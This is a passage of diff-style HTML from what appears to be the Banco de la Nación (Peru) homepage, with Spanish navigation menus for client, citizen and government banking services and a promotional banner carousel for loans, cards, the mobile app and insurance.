+                    <li> <a href="/clientes/cheques/suspension-pago.asp">
+                            Suspensión de pago de cheques </a> </li>
+                </ul>
+            </li>
+
+            <li class="programa-microfinanzas">
+                <button class="btn-submenu">
+                    Programa Microfinanzas
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li> <a href="/clientes/programa-microfinanzas/oficina-compartida-mype.asp">
+                            Oficina Compartida - Ventanilla MYPE </a> </li>
+                    <li> <a href="/clientes/programa-microfinanzas/linea-credito-promype.asp">
+                            Línea de Crédito - PROMYPE </a> </li>
+                </ul>
+            </li>
+
+            <li class="servicios-adicionales">
+                <button class="btn-submenu">
+                    Servicios adicionales
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li> <a href="/clientes/servicios-adicionales/cambio-moneda.asp">
+                            Cambio de moneda </a></li>
+                    <li> <a href="/clientes/servicios-adicionales/certificacion-pago.asp">
+                            Certificaciones de pago </a></li>
+                    <li> <a href="/clientes/servicios-adicionales/certificados-bancarios.asp">
+                            Certificados bancarios </a></li>
+                    <li> <a href="/clientes/servicios-adicionales/microfilm.asp">
+                            Copia microfilm / emisión de estado de cuenta corriente </a></li>
+                    <li> <a href="/clientes/servicios-adicionales/cobranzas-exterior.asp">
+                            Cobranzas simples recibidas del exterior </a></li>
+                    <li> <a href="/clientes/servicios-adicionales/corresponsalia.asp">
+                            Corresponsalía </a></li>
+                    <li> <a href="/clientes/servicios-adicionales/deposito-judicial-administrativo.asp">
+                            Depósitos Judiciales y Administrativos </a></li>
+                    <li> <a href="/clientes/banca-internet/comercio-electronico.asp">
+                            Comercio electrónico </a></li>
+                    <li> <a href="/clientes/servicios-adicionales/derechos-pensionarios.asp">
+                            Reconocimiento de derechos pensionarios </a></li>
+                    <li> <a href="/clientes/servicios-adicionales/servicio-yape-con-bn.asp">
+                            Servicio Yape con el BN </a></li>
+					<li><a href="clientes/servicios-adicionales/cuenta-recaudadora.asp" title="Servicio Cuenta recaudadora">Cuenta recaudadora – Organizaciones Políticas</a></li>
+                </ul>
+            </li>
+        </ul>
+    </div>
+
+    <div class="item canales-digitales" tabindex="0">
+        <div class="ctn-title-menu">
+            <p class="title-menu">Canales Digitales</p>
+            <svg class="svg-mas" height="20px" viewBox="0 0 24 24" width="20px" fill="#323639">
+    <path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z" />
+</svg><svg class="svg-menos" enable-background="new 0 0 24 24" height="24px" viewBox="0 0 24 24" width="24px" fill="#000000">
+    <g>
+        <rect fill="none" fill-rule="evenodd" height="24" width="24" />
+        <rect fill-rule="evenodd" height="2" width="16" x="4" y="11" />
+    </g>
+</svg>
+        </div>
+        <span class="span-svg-mid">
+    <svg width="24" height="24" viewBox="0 0 24 24">
+        <path d="M16.59 8.59L12 13.17 7.41 8.59 6 10l6 6 6-6z"></path>
+    </svg>
+</span>
+        <ul class="submenu unico">
+            
+            <li>
+                <a href="/canales-digitales/app-banca-movil.asp">
+                    App - BN
+                </a>
+            </li>
+			<li>
+                <a href="/clientes/billetera-movil.asp">
+                    Billetera Móvil
+                </a>
+            </li>
+            <li>
+                <a target="_blank" href="/cuentadni.asp">
+                    Cuenta DNI
+                </a>
+            </li>
+            <li>
+                <a href="/clientes/banca-internet/banca-internet.asp">
+                    Banca por Internet
+                </a>
+            </li>
+            <li>
+                <a href="/clientes/pagalo-pe.asp">
+                    Págalo.pe
+                </a>
+            </li>
+			<li>
+                <a href="/clientes/banca-internet/banca-empresarial.asp">
+                    Banca Empresarial
+                </a>
+            </li>
+        </ul>
+    </div>
+
+    <div class="item Beneficios solo" tabindex="0">
+        <a class="ctn-title-menu"  href="/clientes/bnbeneficios.asp">
+            <p class="title-menu">BN Beneficios</p>
+        </a>
+        <!-- <div class="ctn-title-menu">
+            <p class="title-menu">BN Beneficios</p>
+            include virtual="/icono-mas-svg.html"
+            include virtual="/icono-menos-svg.html"
+        </div>
+        include virtual="/icono-desplegable-abajo-svg.html"
+        <ul class="submenu unico">
+            <li>
+                <a target="_blank" href="/clientes/bnbeneficios.asp">BN Beneficios</a>
+            </li>
+        </ul> -->
+    </div>
+</div>
+        <!-- ========== CLIENTES ========== -->
+
+        <!-- ========== CIUDADANOS ========== -->
+        <div class="menu submenu-rsv-ciudadanos">
+    <div class="item productos-servicios" tabindex="0">
+        <div class="ctn-title-menu">
+            <p class="title-menu">Productos y Servicios</p>
+            <svg class="svg-mas" height="20px" viewBox="0 0 24 24" width="20px" fill="#323639">
+    <path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z" />
+</svg><svg class="svg-menos" enable-background="new 0 0 24 24" height="24px" viewBox="0 0 24 24" width="24px" fill="#000000">
+    <g>
+        <rect fill="none" fill-rule="evenodd" height="24" width="24" />
+        <rect fill-rule="evenodd" height="2" width="16" x="4" y="11" />
+    </g>
+</svg>
+        </div>
+        <span class="span-svg-mid">
+    <svg width="24" height="24" viewBox="0 0 24 24">
+        <path d="M16.59 8.59L12 13.17 7.41 8.59 6 10l6 6 6-6z"></path>
+    </svg>
+</span>
+        <ul class="submenu">
+            <li class="telegiros">
+                <button class="btn-submenu">
+                    Telegiros
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li>
+                        <a href="/ciudadanos/giros/nacional-extranjero.asp">
+                            Telegiros de Moneda Nacional y Extranjera
+                        </a>
+                    </li>
+                    <!--<li>
+                        <a href="/ciudadanos/giros/masivos.asp">
+                            Masivos
+                        </a>
+                    </li>-->
+                </ul>
+            </li>
+            <!-- <hr class="enlaces-linea"> -->
+            <li class="pagos">
+                <button class="btn-submenu">
+                    Pagos
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li>
+                        <a href="/tramites-entidades-publicas/tupas-tasas.asp">
+                            Tributos (Tramites entidades públicas)
+                        </a>
+                    </li>
+                    <li>
+                        <a href="/ciudadanos/pagos/proveedores-estado.asp">
+                            Proveedores de las Unidades Ejecutoras del Estado Peruano
+                        </a>
+                    </li>
+                    <li>
+                        <a href="/ciudadanos/pagos/recarga-celulares.asp">
+                            Recarga de celulares
+                        </a>
+                    </li>
+                </ul>
+            </li>
+            <!-- <hr class="enlaces-linea"> -->
+            <li class="cheques">
+                <button class="btn-submenu">
+                    Cheques
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li>
+                        <a href="/ciudadanos/cheques/canje-electronico.asp">
+                            Canje electrónico de cheques (Ciudadanos)
+                        </a>
+                    </li>
+                </ul>
+            </li>
+            <!-- <hr class="enlaces-linea"> -->
+            <li class="servicios-adicionales">
+                <button class="btn-submenu">
+                    Servicios adicionales
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li>
+                        <a href="/ciudadanos/servicios-adicionales/cambio-moneda.asp">
+                            Cambio de moneda
+                        </a>
+                    </li>
+                </ul>
+            </li>
+        </ul>
+    </div>
+
+    <div class="item canales-digitales" tabindex="0">
+        <div class="ctn-title-menu">
+            <p class="title-menu">Canales Digitales</p>
+            <svg class="svg-mas" height="20px" viewBox="0 0 24 24" width="20px" fill="#323639">
+    <path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z" />
+</svg><svg class="svg-menos" enable-background="new 0 0 24 24" height="24px" viewBox="0 0 24 24" width="24px" fill="#000000">
+    <g>
+        <rect fill="none" fill-rule="evenodd" height="24" width="24" />
+        <rect fill-rule="evenodd" height="2" width="16" x="4" y="11" />
+    </g>
+</svg>
+        </div>
+        <span class="span-svg-mid">
+    <svg width="24" height="24" viewBox="0 0 24 24">
+        <path d="M16.59 8.59L12 13.17 7.41 8.59 6 10l6 6 6-6z"></path>
+    </svg>
+</span>
+        <ul class="submenu unico">
+            <li>
+                <a href="/ciudadanos/billetera-movil.asp">
+                    Billetera Movil
+                </a>
+            </li>
+            
+            <li>
+                <a href="/ciudadanos/pagalo-pe.asp">
+                    Págalo.pe
+                </a>
+            </li>
+        </ul>
+    </div>
+
+    <div class="item atencion-al-cliente" tabindex="0">
+        <div class="ctn-title-menu">
+            <p class="title-menu">Atención al cliente</p>
+            <svg class="svg-mas" height="20px" viewBox="0 0 24 24" width="20px" fill="#323639">
+    <path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z" />
+</svg><svg class="svg-menos" enable-background="new 0 0 24 24" height="24px" viewBox="0 0 24 24" width="24px" fill="#000000">
+    <g>
+        <rect fill="none" fill-rule="evenodd" height="24" width="24" />
+        <rect fill-rule="evenodd" height="2" width="16" x="4" y="11" />
+    </g>
+</svg>
+        </div>
+        <span class="span-svg-mid">
+    <svg width="24" height="24" viewBox="0 0 24 24">
+        <path d="M16.59 8.59L12 13.17 7.41 8.59 6 10l6 6 6-6z"></path>
+    </svg>
+</span>
+        <ul class="submenu unico">
+            <li>
+                <a href="/atencion-cliente/atencion-cliente-c.asp">
+                    Atención al cliente
+                </a>
+            </li>
+        </ul>
+    </div>
+</div>
+        <!-- ========== CIUDADANOS ========== -->
+
+        <!-- ========== ENTIDADES DEL GOBIERNO ========== -->
+        <div class="menu submenu-rsv-entidades-gobierno">
+    <div class="item productos-servicios" tabindex="0">
+        <div class="ctn-title-menu">
+            <p class="title-menu">Productos y Servicios</p>
+            <svg class="svg-mas" height="20px" viewBox="0 0 24 24" width="20px" fill="#323639">
+    <path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z" />
+</svg><svg class="svg-menos" enable-background="new 0 0 24 24" height="24px" viewBox="0 0 24 24" width="24px" fill="#000000">
+    <g>
+        <rect fill="none" fill-rule="evenodd" height="24" width="24" />
+        <rect fill-rule="evenodd" height="2" width="16" x="4" y="11" />
+    </g>
+</svg>
+        </div>
+        <span class="span-svg-mid">
+    <svg width="24" height="24" viewBox="0 0 24 24">
+        <path d="M16.59 8.59L12 13.17 7.41 8.59 6 10l6 6 6-6z"></path>
+    </svg>
+</span>
+        <ul class="submenu subsubmenu-largo">
+            <li class="cuentas-ahorros">
+                <button class="btn-submenu">
+                    Cuentas de ahorros
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li> <a href="/entidades-gobierno/cuentas-ahorros/ahorros-sector-publico.asp"> Cuenta de ahorros del sector público en MN y ME </a></li>
+                    <li> <a href="/entidades-gobierno/cuentas-ahorros/cuna-mas.asp"> Cuentas de ahorros Comités de Gestión – Cuna Más </a></li>
+                    <li> <a href="/entidades-gobierno/cuentas-ahorros/pension-alimentos-MN.asp"> Cuentas de ahorros de Consignación de pensión de Alimentos - MN </a></li>
+                </ul>
+            </li>
+            <!-- <hr class="enlaces-linea"> -->
+            <li class="cuentas-corrientes">
+                <button class="btn-submenu">
+                    Cuentas corrientes
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu adaptacion-subsubmenu-ul-li">
+                    <li> <a href="/entidades-gobierno/cuentas-corrientes/instituciones-educativas.asp"> Cuentas corrientes Instituciones Educativas Administradas por Municipalidades</a></li>
+                    <li> <a href="/entidades-gobierno/cuentas-corrientes/gobiernos-locales.asp"> Cuentas corrientes Gobiernos Locales</a></li>
+                    <li> <a href="/entidades-gobierno/cuentas-corrientes/mancomunidad-municipal.asp"> Cuentas corrientes Mancomunidad Municipal</a></li>
+                    <li> <a href="/entidades-gobierno/cuentas-corrientes/centros-poblados.asp"> Cuentas corrientes Municipalidades de Centros Poblados</a></li>
+                    <li> <a href="/entidades-gobierno/cuentas-corrientes/institutos-viales.asp"> Cuenta corriente para Institutos Viales Provinciales (IVP)</a></li>
+                    <li> <a href="/entidades-gobierno/cuentas-corrientes/organizaciones-politicas.asp"> Cuentas corrientes para Organizaciones Políticas</a></li>
+                    <li> <a href="/entidades-gobierno/cuentas-corrientes/direccion-nacional-tesoro-publico.asp"> Cuentas corrientes para la Dirección General del Tesoro Público- MEF</a></li>
+                    <li> <a href="/entidades-gobierno/cuentas-corrientes/cafae.asp"> Cuentas corrientes para Cafae y Sub-Cafae</a></li>
+                    <li> <a href="/entidades-gobierno/cuentas-corrientes/instituciones-educativas-estatales.asp"> Cuentas corrientes Instituciones Educativas Estatales</a></li>
+                    <li> <a href="/entidades-gobierno/cuentas-corrientes/nucleos-ejecutores.asp"> Cuentas corrientes para Núcleos Ejecutores</a></li>
+                    <li> <a href="/entidades-gobierno/cuentas-corrientes/qali-warma.asp"> Cuenta corriente comités de compras – Qali Warma</a></li>
+                    <li> <a href="/entidades-gobierno/cuentas-corrientes/sociedades-beneficiencia.asp"> Cuenta corriente Sociedades de Beneficencia</a></li>
+                    <li> <a href="/entidades-gobierno/cuentas-corrientes/junta-usuarios.asp"> Cuenta corriente Junta de Usuarios</a></li>
+                </ul>
+            </li>
+            <!-- <hr class="enlaces-linea"> -->
+            <li class="recaudacion">
+                <button class="btn-submenu">
+                    Recaudación
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li> <a href="/entidades-gobierno/recaudacion/tributos-municipales.asp">Tributos Municipales</a></li>
+                    <li> <a href="/entidades-gobierno/recaudacion/tasas.asp">Tasas</a></li>
+                    <li> <a href="/entidades-gobierno/recaudacion/tributos-aduaneros.asp">Tributos Aduaneros</a></li>
+                    <li> <a href="/entidades-gobierno/recaudacion/tributos-gobiernos-regionales.asp">Tributos Gobiernos Regionales</a></li>
+                    <li> <a href="/entidades-gobierno/recaudacion/tributos-sunat.asp">SUNAT</a></li>
+                </ul>
+            </li>
+            <!-- <hr class="enlaces-linea"> -->
+            <li class="fideicomisos">
+                <button class="btn-submenu">
+                    Fideicomisos
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li>
+                        <a href="/entidades-gobierno/fideicomisos/fideicomisos.asp"> Fideicomisos</a>
+                    </li>
+                    <li>
+                        <a href="/entidades-gobierno/fideicomisos/fideicomisos-gobiernos.asp"> Fideicomisos en gobiernos</a>
+                    </li>
+                </ul>
+            </li>
+            <!-- <hr class="enlaces-linea"> -->
+            <li class="pagos-cheques">
+                <button class="btn-submenu">
+                    Pagos / cheques
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li>
+                        <a href="/entidades-gobierno/pagos/proveedores-estado.asp"> Pago a Proveedores de las Unidades Ejecutoras del Estado Peruano</a>
+                    </li>
+                    <li>
+                        <a href="/entidades-gobierno/pagos/canje-electronico.asp"> Canje electrónico de cheques (Municipalidad y Gobierno)</a>
+                    </li>
+                </ul>
+            </li>
+            <!-- <hr class="enlaces-linea"> -->
+            <li class="transferencias">
+                <button class="btn-submenu">
+                    Transferencias
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li>
+                        <a href="/entidades-gobierno/transferencias/mismo-banco-otras-plazas.asp"> Transferencia a cuenta corriente del mismo Banco, de la misma plaza u otra plaza (Municipalidad)</a>
+                    </li>
+                    <li>
+                        <a href="/entidades-gobierno/transferencias/mismo-banco-otras-plazas-gobierno.asp"> Transferencia a cuenta corriente del mismo Banco, de la misma plaza u otra plaza (Gobierno)</a>
+                    </li>
+                    <li>
+                        <a href="/entidades-gobierno/transferencias/interbancaria-cargo-cuenta-corriente.asp"> Transferencia Interbancaria con cargo en Cuentas Corrientes (Municipalidad y Gobierno)</a>
+                    </li>
+                    <li>
+                        <a href="/entidades-gobierno/transferencias/transferencias-lbtr.asp"> Transferencias LBTR (Municipalidad y Gobierno)</a>
+                    </li>
+                    <li>
+                        <a href="/entidades-gobierno/transferencias/fondos-al-exterior.asp"> Transferencias de fondos al exterior</a>
+                    </li>
+                </ul>
+            </li>
+            <!-- <hr class="enlaces-linea"> -->
+            <li class="creditos-indirectos">
+                <button class="btn-submenu">
+                    Créditos Indirectos
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li>
+                        <a href="/entidades-gobierno/creditos-indirectos/carta-fianza.asp"> Carta fianza en moneda nacional y extranjera</a>
+                    </li>
+                    <li>
+                        <a href="/entidades-gobierno/creditos-indirectos/documentario.asp"> Crédito documentario</a>
+                    </li>
+                </ul>
+            </li>
+            <!-- <hr class="enlaces-linea"> -->
+            <li class="creditos-directos">
+                <button class="btn-submenu">
+                    Créditos Directos
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li>
+                        <a href="/entidades-gobierno/creditos-directos/gobiernos-regionales.asp"> Préstamo - Gobiernos Regionales</a>
+                    </li>
+                    <li>
+                        <a href="/entidades-gobierno/creditos-directos/gobiernos-nacionales.asp"> Préstamo - Gobiernos Nacionales</a>
+                    </li>
+                </ul>
+            </li>
+            <!-- <hr class="enlaces-linea"> -->
+            <li class="garantias-bancarias">
+                <button class="btn-submenu">
+                    Garantías Bancarias
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li>
+                        <a href="/entidades-gobierno/garantias-bancarias/bancos-exterior.asp">Contragarantizadas por Bancos del Exterior</a>
+                    </li>
+                    <li>
+                        <a href="/entidades-gobierno/garantias-bancarias/banco-nacion.asp">Contragarantías de bancos del exterior</a>
+                    </li>
+                </ul>
+            </li>
+            <!-- <hr class="enlaces-linea"> -->
+            <li class="programas-sociales">
+                <button class="btn-submenu">
+                    Programas sociales
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li>
+                        <a href="/entidades-gobierno/programas-sociales/juntos.asp"> Juntos</a>
+                    </li>
+                    <li>
+                        <a href="/entidades-gobierno/programas-sociales/pension-65.asp"> Pensión 65</a>
+                    </li>
+                </ul>
+            </li>
+            <!-- <hr class="enlaces-linea"> -->
+            <li class="servicios-adicionales">
+                <button class="btn-submenu">
+                    Servicios adicionales
+                    <svg viewBox="0 0 24 24">
+    <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z" />
+</svg>
+                </button>
+                <ul class="subsubmenu">
+                    <li>
+                        <a href="/entidades-gobierno/servicios-adicionales/documentos-microfilmados.asp"> Copia de Documentos Microfilmados de Cuenta Corriente</a>
+                    </li>
+                    <li>
+                        <a href="/entidades-gobierno/servicios-adicionales/casilleros-seguridad.asp"> Alquiler de Casillero de Seguridad</a>
+
+                    </li>
+                    <li>
+                        <a href="/entidades-gobierno/servicios-adicionales/cobranza-coactiva.asp"> Cobranza coactiva </a>
+
+                    </li>
+                    <li>
+                        <a href="/entidades-gobierno/servicios-adicionales/cobranza-giro-bancario-exterior.asp"> Cobranza de giro bancario sobre el exterior </a>
+
+                    </li>
+                    <li>
+                        <a href="/entidades-gobierno/servicios-adicionales/confirmacion-saldo.asp"> Confirmación de saldos </a>
+
+                    </li>
+                    <li>
+                        <a href="/entidades-gobierno/servicios-adicionales/habilitacion-fondos-entidades.asp"> Habilitación de fondos entidades públicas </a>
+
+                    </li>
+                    <li>
+                        <a href="/entidades-gobierno/servicios-adicionales/notas-credito-negociable.asp"> Notas de crédito negociable </a>
+
+                    </li>
+                    <li>
+                        <a href="/entidades-gobierno/servicios-adicionales/registro-firma-notarios.asp"> Registro de Firma - Notarios Públicos </a>
+
+                    </li>
+                    <li>
+                        <a href="/entidades-gobierno/servicios-adicionales/linea-credito.asp"> Línea de crédito</a>
+
+                    </li>
+                    <li>
+                        <a href="/entidades-gobierno/servicios-adicionales/gobiernos-locales.asp"> Préstamos a Gobiernos Locales</a>
+
+                    </li>
+                </ul>
+            </li>
+        </ul>
+    </div>
+
+    <div class="item canales-digitales" tabindex="0">
+        <div class="ctn-title-menu">
+            <p class="title-menu">Canales Digitales</p>
+            <svg class="svg-mas" height="20px" viewBox="0 0 24 24" width="20px" fill="#323639">
+    <path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z" />
+</svg><svg class="svg-menos" enable-background="new 0 0 24 24" height="24px" viewBox="0 0 24 24" width="24px" fill="#000000">
+    <g>
+        <rect fill="none" fill-rule="evenodd" height="24" width="24" />
+        <rect fill-rule="evenodd" height="2" width="16" x="4" y="11" />
+    </g>
+</svg>
+        </div>
+        
+        <span class="span-svg-mid">
+    <svg width="24" height="24" viewBox="0 0 24 24">
+        <path d="M16.59 8.59L12 13.17 7.41 8.59 6 10l6 6 6-6z"></path>
+    </svg>
+</span>
+        <ul class="submenu unico">
+            <li>
+                <a href="/clientes/servicios-adicionales/billetera-movil.asp">
+                    Billetera Movil
+                </a>
+            </li>
+            <li>
+                <a href="/clientes/app-movil/pagalo-pe.asp">
+                    Págalo.pe
+                </a>
+            </li>
+        </ul>
+    </div>
+    <div class="item atencion-al-cliente" tabindex="0">
+        <div class="ctn-title-menu">
+            <p class="title-menu">Atención al cliente</p>
+            <svg class="svg-mas" height="20px" viewBox="0 0 24 24" width="20px" fill="#323639">
+    <path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z" />
+</svg><svg class="svg-menos" enable-background="new 0 0 24 24" height="24px" viewBox="0 0 24 24" width="24px" fill="#000000">
+    <g>
+        <rect fill="none" fill-rule="evenodd" height="24" width="24" />
+        <rect fill-rule="evenodd" height="2" width="16" x="4" y="11" />
+    </g>
+</svg>
+        </div>
+        <span class="span-svg-mid">
+    <svg width="24" height="24" viewBox="0 0 24 24">
+        <path d="M16.59 8.59L12 13.17 7.41 8.59 6 10l6 6 6-6z"></path>
+    </svg>
+</span>
+        <ul class="submenu unico">
+            <li>
+                <a href="/atencion-cliente/atencion-cliente-eg.asp">
+                    Atención al cliente
+                </a>
+            </li>
+        </ul>
+    </div>
+</div>
+        <!-- ========== ENTIDADES DEL GOBIERNO ========== -->
+
+        <div class="buscar-responsive">
+            <p>Buscar</p>
+            <svg xmlns="https://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                <path
+                    d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z" />
+            </svg>
+        </div>
+
+    </div>
+</div>
+
+    <div class="ctn-cuerpo-completo-select">
+
+        <div class="ctn-banner">
+    <div id="slider-container">
+        <div id="slider">
+			<!--.................-->
+				<div class="slide">
+                <div class="slide-txt">	
+                    <h1 class="slider-txt-title">¡Hazlo #SinEfectivo!</h1>
+                    <div class="slider-txt-sub">
+                        <p>Paga al instante desde tu celular, web o con tu tarjeta Débito BN.</p>
+                   </div>
+                </div>
+                <img class="carousel-image ocultar-imagen" src="img/banner/sin-efectivo-solo.png"  alt="Imagen Sin efectivo" title="Sin efectivo">
+                <img class="carousel-image ocultar-imagen2" src="img/banner/sin-efectivo.png" alt="Imagen Sin efectivo" title="Sin efectivo" >
+				</div>
+			
+			<!--.................--> 
+			
+			<a class="slide" href="https://info.bn.com.pe/evaluacion" target="_blank">
+                <div class="slide-txt">
+                    <h1 class="slider-txt-title">Impulsa tus planes con el Préstamo Multired</h1>
+                    <div class="slider-txt-sub">
+                        <p>Solicítalo fácil y rápido en nuestras agencias.</p>
+                       
+                   </div>
+                    <p class="slider-btn">Más información</p>
+                </div>
+                <img class="carousel-image ocultar-imagen" src="img/banner/prestamo-solo.png" title="Préstamo Multired" alt="Imagen Préstamo Multired">
+                <img class="carousel-image ocultar-imagen2" src="img/banner/prestamo.png" title="Préstamo Multired" alt="Imagen Préstamo Multired">
+
+            </a>
+			
+			<!--.................-->                      
+ 			<a class="slide" target="_blank" href="https://info.bn.com.pe/TC" title="información TC">
+                <div class="slide-txt">
+                    <h1 class="slider-txt-title">Tarjeta Crédito BN, tu aliada para cada compra</h1>
+                    <div class="slider-txt-sub">
+                        <p>Úsala en comercios físicos y digitales.</p>
+                       
+                   </div>
+                    <p class="slider-btn">Más información</p>
+                </div>
+                <img class="carousel-image ocultar-imagen" src="img/banner/tarjeta-credito-solo.png"  alt="Imagen Tarjeta Crédito" title="Tarjeta Crédito">
+                <img class="carousel-image ocultar-imagen2" src="img/banner/tarjeta-credito.png" alt="Imagen Tarjeta Crédito" title="Tarjeta Crédito">
+            </a>
+			
+			<!--.................--> 
+			<a class="slide" href="https://www.bn.com.pe/canales-digitales/app-banca-movil.asp" >
+                <div class="slide-txt">
+                    <h1 class="slider-txt-title">Con tu App BN ahora puedes pagar usando código QR</h1>
+                    <div class="slider-txt-sub">
+                        <p>Realiza pagos y transferencias desde el App BN sin usar efectivo. Ágil, seguro y #ParaTodos</p>
+                       
+                   </div>
+                    <p class="slider-btn">Más información</p>
+                </div>
+                <img class="carousel-image ocultar-imagen" src="img/banner/AppBN-solo.png" title="App BN" alt="Imagen App BN">
+                <img class="carousel-image ocultar-imagen2" src="img/banner/AppBN.png" title="App BN" alt="Imagen App BN">
+
+            </a>
+			
+			<!--.................-->
+			
+			
+			<!--<a class="slide" target="_blank" href="https://www.bn.com.pe/canales-atencion/canales-alternos.asp">
+                <div class="slide-txt">
+					
+                    <h1 class="slider-txt-title">¡El Banco está más cerca de ti!</h1>
+                    <div class="slider-txt-sub">
+                        <p>Conoce aquí todos nuestros canales alternos</p>
+                   </div>
+                    <p class="slider-btn">Más información</p>
+                </div>
+                <img class="carousel-image ocultar-imagen" src="img/banner/canales-alternos-solo.png"  alt="Imagen canales alternos" title="canales alternos">
+                <img class="carousel-image ocultar-imagen2" src="img/banner/canales-alternos.png" alt="Imagen canales alternos" title="canales alternos" >
+            </a>-->
+			
+			<!--.................-->
+
+    		<!--<a class="slide" target="_blank" href="https://www.bnbeneficios.pe/">
+                <div class="slide-txt">
+					
+                    <p class="slider-txt-title">¡Gana un iPhone 16 con BN beneficios! </p>
+                    <div class="slider-txt-sub">
+                        <p>Inscríbete ahora y participa de este sorteo.<br>
+							Si ya estas inscrito, por cada S/10 de compra acumulas una opción.</p>
+                   </div>
+                    <p class="slider-btn">Más información</p>
+                </div>
+                <img class="carousel-image ocultar-imagen" src="img/banner/bnbeneficios-solo.png"
+                    alt="Imagen Beneficios" title="Beneficios">
+                <img class="carousel-image ocultar-imagen2" src="img/banner/bnbeneficios.png"
+                    alt="Imagen Beneficios" title="BN Beneficios">
+            </a>-->
+        
+        <!--.................-->
+					
+         <div class="slide">
+                <div class="slide-txt">
+					
+                    <h1 class="slider-txt-title">Más coberturas y mejores beneficios en cada uno de nuestros seguros.
+</h1>
+                    <div class="slider-txt-sub">
+                        <p>¡Prevén hoy y asegura tu tranquilidad!</p>
+                   </div>
+                 </div>
+                <img class="carousel-image ocultar-imagen" src="img/banner/cuota-protegida-solo.png"  alt="Imagen cuota protegida" title="cuota protegida">
+                <img class="carousel-image ocultar-imagen2" src="img/banner/cuota-protegida.png" alt="Imagen cuota protegida" title="cuota protegida" >
+            </div>
+			
+			<!--<a class="slide" target="_blank" href="/clientes/seguros/formatos/ganadores-seguro-cuota-protegida-2025.pdf" title="documento en formato pdf">
+                <div class="slide-txt">
+					
+                    <h1 class="slider-txt-title">Más coberturas y mejores beneficios en cada uno de nuestros seguros.
+</h1>
+                    <div class="slider-txt-sub">
+                        <p>¡Prevén hoy y asegura tu tranquilidad!</p>
+                   </div>
+                    <p class="slider-btn">Más información</p>
+                </div>
+                <img class="carousel-image ocultar-imagen" src="img/banner/cuota-protegida-solo.png"  alt="Imagen cuota protegida" title="cuota protegida">
+                <img class="carousel-image ocultar-imagen2" src="img/banner/cuota-protegida.png" alt="Imagen cuota protegida" title="cuota protegida" >
+            </a>-->
+			
+            
+
+        </div>
+        <div tabindex="0" id="prev">&#10094;</div>
+        <div tabindex="0" id="next">&#10095;</div>
+        <div id="page-counter">
+        </div>
+    </div>
+</div><div class="ctn-productos mw-1366">
+    <div class="all-productos">
+        <div class="productos-txt">
+            <h2>Productos pensados en ti</h2>
+        </div>
+        <div class="ctn-all-items">
+            <div class="ctn-productos-items">
+                <div class="productos-items">
+                    <a href="clientes/prestamos/prestamo-bn.asp" class="productos" title="Producto Prestamo">
+                        <div class="img">
+                            <img src="img/productos/prestamos-multired.png" alt="imagen de Préstamos">
+                        </div>
